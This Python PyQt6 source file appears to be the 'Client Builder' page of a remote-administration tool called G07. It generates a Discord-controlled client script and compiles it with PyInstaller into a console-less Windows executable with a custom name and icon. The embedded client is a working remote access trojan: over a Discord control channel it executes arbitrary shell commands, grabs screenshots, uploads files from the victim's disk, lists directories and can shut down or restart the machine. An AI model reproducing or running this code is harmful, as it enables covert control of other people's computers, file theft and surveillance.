import os
import json
import shutil
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
                              QLineEdit, QPushButton, QFrame, QFileDialog,
                              QProgressBar)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QPropertyAnimation, QEasingCurve
import importlib
import importlib.util
from gui.styles import Styles
from utils.config_manager import ConfigManager

class BuildWorker(QThread):
    progress = pyqtSignal(int)
    finished = pyqtSignal(bool, str)
    status = pyqtSignal(str)
    def __init__(self, name, guild_id, token, icon_path):
        super().__init__()
        self.name = name
        self.guild_id = guild_id
        self.token = token
        self.icon_path = icon_path

    def run(self):
        try:
            import sys, subprocess, shlex
            self.status.emit("Creating client script...")
            self.progress.emit(10)

            build_root = os.path.join(os.getcwd(), "G07-Build")
            os.makedirs(build_root, exist_ok=True)
            dist_dir = os.path.join(build_root, "dist")
            work_dir = os.path.join(build_root, "build")
            os.makedirs(dist_dir, exist_ok=True)
            os.makedirs(work_dir, exist_ok=True)

            self.status.emit("Generating client code...")
            self.progress.emit(25)
            client_code = self.generate_client_code()
            client_path = os.path.join(build_root, "client.py")
            with open(client_path, 'w', encoding='utf-8') as f:
                f.write(client_code)

            self.status.emit("Spawning PyInstaller...")
            self.progress.emit(45)

            cmd = [
                sys.executable, '-m', 'PyInstaller',
                client_path,
                '--onefile', '--noconsole',
                f'--name={self.name}',
                f'--distpath={dist_dir}',
                f'--workpath={work_dir}',
                f'--specpath={build_root}'
            ]
            if self.icon_path and os.path.exists(self.icon_path):
                cmd.append(f'--icon={self.icon_path}')

            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            except FileNotFoundError as fe:
                self.finished.emit(False, f"Python executable not found: {fe}")
                return
            except Exception as e:
                self.finished.emit(False, f"Failed to start PyInstaller: {e}")
                return

            collected = []
            line_count = 0
            while True:
                line = proc.stdout.readline() if proc.stdout else ''
                if not line:
                    if proc.poll() is not None:
                        break
                else:
                    line_count += 1
                    line_clean = line.rstrip()
                    if line_clean:
                        collected.append(line_clean)
                        if line_count % 8 == 0:
                            self.status.emit(f"PyInstaller: {line_clean[:70]}")
                            current_prog = min(90, 45 + int(line_count * 0.5))
                            self.progress.emit(current_prog)
            ret = proc.wait()
            if ret != 0:
                tail = '\n'.join(collected[-15:])
                self.finished.emit(False, f"PyInstaller failed (exit {ret}). Last output:\n{tail}")
                return

            self.status.emit("Finalizing build...")
            self.progress.emit(95)
            exe_path = os.path.join(dist_dir, f"{self.name}.exe")
            if not os.path.exists(exe_path):
                alt = os.path.join(build_root, f"{self.name}.exe")
                if os.path.exists(alt):
                    exe_path = alt
                else:
                    self.finished.emit(False, "Executable not found after build")
                    return
            try:
                self.status.emit("Cleaning up...")
                self.progress.emit(97)
                build_root = build_root
                final_target = os.path.join(build_root, f"{self.name}.exe")
                try:
                    if os.path.abspath(exe_path) != os.path.abspath(final_target):
                        if os.path.exists(final_target):
                            try:
                                os.remove(final_target)
                            except Exception:
                                pass
                        shutil.move(exe_path, final_target)
                        exe_path = final_target
                except Exception:
                    pass
                for entry in os.listdir(build_root):
                    full = os.path.join(build_root, entry)
                    if os.path.abspath(full) == os.path.abspath(exe_path):
                        continue
                    try:
                        if os.path.isdir(full):
                            shutil.rmtree(full, ignore_errors=True)
                        else:
                            os.remove(full)
                    except Exception:
                        pass
            except Exception:
                pass
            self.progress.emit(100)
            self.status.emit("Build complete!")
            self.finished.emit(True, exe_path)
        except BaseException as e:
            self.finished.emit(False, f"Unexpected build error: {e}")

    def generate_client_code(self):
        template = '''import discord
import socket
import json
import platform
import subprocess
import os
import asyncio
import io
import time
from discord.ext import commands

try:
    from PIL import ImageGrab
    PIL_AVAILABLE = True
except Exception:
    PIL_AVAILABLE = False

GUILD_ID = __GUILD_ID__
TOKEN = "__TOKEN__"
CONTROL_CHANNEL = "g07-control"

INTENTS = discord.Intents.default()
INTENTS.message_content = True
bot = commands.Bot(command_prefix="!", intents=INTENTS)

HOSTNAME = socket.gethostname()
try:
    IP_ADDRESS = socket.gethostbyname(HOSTNAME)
except Exception:
    IP_ADDRESS = "0.0.0.0"

MAX_MSG = 1800

async def safe_send(channel, content=None, **kwargs):
    try:
        if content and len(content) > 1900:
            content = content[:1900] + "\\n...truncated"
        await channel.send(content, **kwargs)
    except Exception:
        pass

async def send_pong(channel):
    await safe_send(channel, f"PONG: {HOSTNAME} ({IP_ADDRESS})")

async def handle_cmd(channel, raw):
    cmd = raw.strip()
    if not cmd:
        await safe_send(channel, f"CMDOUT {IP_ADDRESS}: (empty command)")
        return
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=25)
        out = (proc.stdout or '') + ('\\n' + proc.stderr if proc.stderr else '')
        out = out.strip() or '(no output)'
        if len(out) > MAX_MSG:
            out = out[:MAX_MSG] + "\\n...truncated"
        await safe_send(channel, f"CMDOUT {IP_ADDRESS}: {out}")
    except Exception as e:
        await safe_send(channel, f"CMDOUT {IP_ADDRESS}: Error: {e}")

async def handle_screenshot(channel):
    if not PIL_AVAILABLE:
        await safe_send(channel, f"Screenshot from {HOSTNAME}: PIL not available")
        return
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        await channel.send(f"Screenshot from {HOSTNAME}:", file=discord.File(buf, filename=f"{HOSTNAME}_{int(time.time())}.png"))
    except Exception as e:
        await safe_send(channel, f"Screenshot from {HOSTNAME}: Error {e}")

@bot.event
async def on_ready():
    try:
        guild = bot.get_guild(GUILD_ID)
        if guild:
            channel = discord.utils.get(guild.channels, name=CONTROL_CHANNEL)
            if channel:
                await safe_send(channel, f"Client connected: {HOSTNAME} ({IP_ADDRESS})")
        print(f"[CLIENT] Connected as {bot.user} -> {HOSTNAME} {IP_ADDRESS}")
        # schedule background keep-alive loop safely from the async context
        try:
            asyncio.create_task(keep_alive_loop())
        except Exception:
            pass
    except Exception as e:
        print('On ready error', e)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if not hasattr(message.channel, 'name') or message.channel.name != CONTROL_CHANNEL:
        return

    content = message.content.strip()

    if content.lower() in ('whoami', 'heartbeat'):
        await send_pong(message.channel)
        return

    if ':' in content:
        prefix, cmd = content.split(':', 1)
        if prefix.strip() == IP_ADDRESS:
            cmd_lower = cmd.strip()
            try:
                if cmd_lower.lower() == 'screenshot':
                    await handle_screenshot(message.channel)
                elif cmd_lower.lower() == 'info':
                    await safe_send(message.channel, f"System: {platform.system()} {platform.release()} | Host: {HOSTNAME} | IP: {IP_ADDRESS}")
                elif cmd_lower.lower() == 'shutdown':
                    await safe_send(message.channel, f"Shutting down {HOSTNAME}...")
                    os.system('shutdown /s /t 1')
                elif cmd_lower.lower() == 'restart':
                    await safe_send(message.channel, f"Restarting {HOSTNAME}...")
                    os.system('shutdown /r /t 1')
                elif cmd_lower.lower().startswith('cmd '):
                    await handle_cmd(message.channel, cmd_lower[4:])
                elif cmd_lower.lower().startswith('download '):
                    path = cmd_lower[9:].strip().strip('"')
                    if os.path.isfile(path):
                        try:
                            # prefix with IP for easier routing by controller
                            await message.channel.send(f"FILE {IP_ADDRESS} {os.path.basename(path)}", file=discord.File(path))
                        except Exception as e:
                            await safe_send(message.channel, f"CMDOUT {IP_ADDRESS}: download error: {e}")
                    else:
                        await safe_send(message.channel, f"CMDOUT {IP_ADDRESS}: file not found: {path}")
                elif cmd_lower.lower().startswith('list ') or cmd_lower.lower().startswith('ls '):
                    # List directory contents and send as JSON payload prefixed with FILELIST and IP
                    target = cmd_lower.split(' ', 1)[1].strip() if ' ' in cmd_lower else '.'
                    try:
                        if not os.path.exists(target):
                            await safe_send(message.channel, f"FILELIST {IP_ADDRESS}: {json.dumps({'error': 'not found'})}")
                        else:
                            items = []
                            for name in os.listdir(target):
                                full = os.path.join(target, name)
                                try:
                                    items.append({
                                        'name': name,
                                        'is_dir': os.path.isdir(full),
                                        'size': os.path.getsize(full) if os.path.isfile(full) else 0
                                    })
                                except Exception:
                                    items.append({'name': name, 'is_dir': os.path.isdir(full), 'size': 0})
                            payload = json.dumps({'path': target, 'items': items})
                            await safe_send(message.channel, f"FILELIST {IP_ADDRESS}: {payload}")
                    except Exception as e:
                        await safe_send(message.channel, f"FILELIST {IP_ADDRESS}: {json.dumps({'error': str(e)})}")
                else:
                    await safe_send(message.channel, f"ACK {HOSTNAME}: {cmd_lower}")
            except Exception as e:
                await safe_send(message.channel, f"Error: {e}")

async def keep_alive_loop():
    await bot.wait_until_ready()
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        return
    channel = discord.utils.get(guild.channels, name=CONTROL_CHANNEL)
    if not channel:
        return
    while not bot.is_closed():
        try:
            await channel.send('heartbeat')
        except Exception:
            pass
        await asyncio.sleep(60)


try:
    bot.run(TOKEN)
except KeyboardInterrupt:
    pass
except Exception as e:
    print('Fatal client error', e)

'''

        return template.replace('__GUILD_ID__', str(self.guild_id)).replace('__TOKEN__', str(self.token).replace('"','\\"'))

class BuilderPage(QWidget):
    def __init__(self):
        super().__init__()
        self.config = ConfigManager()
        self.icon_path = None
        self._progress_anim = None
        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(40, 40, 40, 55)
        layout.setSpacing(30)
        
        title = QLabel("Client Builder")
        title.setStyleSheet(Styles.LABEL_TITLE)
        layout.addWidget(title)
        
        subtitle = QLabel("Build a custom client executable")
        subtitle.setStyleSheet(Styles.LABEL_SUBTITLE)
        layout.addWidget(subtitle)
        
        form_frame = QFrame()
        form_frame.setStyleSheet(Styles.CARD)
        form_layout = QVBoxLayout(form_frame)
        form_layout.setSpacing(20)
        form_layout.setContentsMargins(30, 30, 30, 30)
        form_frame.setMinimumWidth(720)
        
        name_label = QLabel("Client Name:")
        name_label.setStyleSheet("color: #ffffff; font-size: 14px; font-weight: bold;")
        form_layout.addWidget(name_label)
        
        self.name_input = QLineEdit()
        self.name_input.setPlaceholderText("Enter client name (e.g., G07-Client)")
        self.name_input.setStyleSheet(Styles.INPUT)
        self.name_input.setFixedHeight(45)
        self.name_input.setMinimumWidth(500)
        form_layout.addWidget(self.name_input)
        
        guild_label = QLabel("Discord Guild ID:")
        guild_label.setStyleSheet("color: #ffffff; font-size: 14px; font-weight: bold;")
        form_layout.addWidget(guild_label)
        
        self.guild_input = QLineEdit()
        self.guild_input.setPlaceholderText("Enter Discord server ID")
        self.guild_input.setStyleSheet(Styles.INPUT)
        self.guild_input.setFixedHeight(45)
        self.guild_input.setMinimumWidth(500)
        form_layout.addWidget(self.guild_input)
        
        token_label = QLabel("Discord Bot Token:")
        token_label.setStyleSheet("color: #ffffff; font-size: 14px; font-weight: bold;")
        form_layout.addWidget(token_label)
        
        self.token_input = QLineEdit()
        self.token_input.setPlaceholderText("Enter bot token")
        self.token_input.setEchoMode(QLineEdit.EchoMode.Password)
        self.token_input.setStyleSheet(Styles.INPUT)
        self.token_input.setFixedHeight(45)
        self.token_input.setMinimumWidth(500)
        form_layout.addWidget(self.token_input)
        
        icon_label = QLabel("Icon (Optional):")
        icon_label.setStyleSheet("color: #ffffff; font-size: 14px; font-weight: bold;")
        form_layout.addWidget(icon_label)
        
        icon_layout = QHBoxLayout()
        self.icon_path_label = QLabel("No icon selected")
        self.icon_path_label.setStyleSheet("color: #8b92a7;")
        icon_layout.addWidget(self.icon_path_label)
        
        icon_btn = QPushButton("Browse...")
        icon_btn.setStyleSheet(Styles.BUTTON_SECONDARY)
        icon_btn.setFixedSize(120, 40)
        icon_btn.clicked.connect(self.select_icon)
        icon_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        icon_layout.addWidget(icon_btn)
        
        form_layout.addLayout(icon_layout)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet(Styles.PROGRESS_BAR)
        self.progress_bar.setFixedHeight(30)
        self.progress_bar.setVisible(False)
        form_layout.addWidget(self.progress_bar)
        
        self.status_label = QLabel("")
        self.status_label.setStyleSheet("color: #00d4ff; font-size: 13px;")
        self.status_label.setVisible(False)
        form_layout.addWidget(self.status_label)
        
        self.build_btn = QPushButton("Build Client")
        self.build_btn.setStyleSheet(Styles.BUTTON)
        self.build_btn.setFixedHeight(58)
        self.build_btn.clicked.connect(self.build_client)
        self.build_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        form_layout.addWidget(self.build_btn)
        
        layout.addWidget(form_frame)
        layout.addStretch()
    
    def select_icon(self):
        file_name, _ = QFileDialog.getOpenFileName(
            self, "Select Icon", "", "Icon Files (*.ico);;All Files (*.*)"
        )
        if file_name:
            self.icon_path = file_name
            self.icon_path_label.setText(os.path.basename(file_name))
            self.icon_path_label.setStyleSheet("color: #00e676;")
    
    def build_client(self):
        name = self.name_input.text().strip()
        guild_id = self.guild_input.text().strip()
        token = self.token_input.text().strip()
        
        if not name or not guild_id or not token:
            try:
                self.window().show_notification("Please fill in all required fields!", level='warn')
            except Exception:
                pass
            return
        
        try:
            guild_id = int(guild_id)
        except ValueError:
            try:
                self.window().show_notification("Guild ID must be a number!", level='warn')
            except Exception:
                pass
            return
        
        try:
            if importlib.util.find_spec('PyInstaller') is None:
                try:
                    self.window().show_notification("PyInstaller not installed. Install via pip: pip install pyinstaller", level='error', duration_ms=8000)
                except Exception:
                    pass
                return

            self.build_btn.setEnabled(False)
            self.progress_bar.setVisible(True)
            self.progress_bar.setValue(0)
            self.status_label.setVisible(True)
            self.status_label.setText("Starting build...")

            self.worker = BuildWorker(name, guild_id, token, self.icon_path)
            self.worker.progress.connect(self.on_worker_progress)
            self.worker.status.connect(self.status_label.setText)
            self.worker.finished.connect(self.build_finished)
            setattr(self, '_active_worker', self.worker)
            self.worker.start()
        except Exception as e:
            try:
                self.window().show_notification(f"Failed to start build: {e}", level='error', duration_ms=7000)
            except Exception:
                pass
            self.build_btn.setEnabled(True)
            self.progress_bar.setVisible(False)
            self.status_label.setVisible(False)
    
    def build_finished(self, success, message):
        """Handle build completion"""
        self.build_btn.setEnabled(True)
        if success and self.progress_bar.value() < 100:
            self.on_worker_progress(100)
        
        if success:
            try:
                self.window().show_notification(f"Client built successfully: {message}", level='success', duration_ms=6000)
            except Exception:
                pass
            self.status_label.setText("Build complete!")
            self.status_label.setStyleSheet("color: #00e676; font-size: 13px;")
        else:
            try:
                self.window().show_notification(f"Build failed: {message}", level='error', duration_ms=7000)
            except Exception:
                pass
            self.status_label.setText("Build failed!")
            self.status_label.setStyleSheet("color: #ff1744; font-size: 13px;")

    def on_worker_progress(self, target_value: int):
        target_value = max(0, min(100, target_value))
        start = self.progress_bar.value()
        if target_value <= start:
            self.progress_bar.setValue(target_value)
            return
        if self._progress_anim is not None:
            try:
                self._progress_anim.stop()
            except Exception:
                pass
        anim = QPropertyAnimation(self.progress_bar, b"value")
        anim.setStartValue(start)
        anim.setEndValue(target_value)
        delta = target_value - start
        anim.setDuration(min(1400, max(250, delta * 28)))
        anim.setEasingCurve(QEasingCurve.Type.OutCubic)
        self._progress_anim = anim
        anim.start()
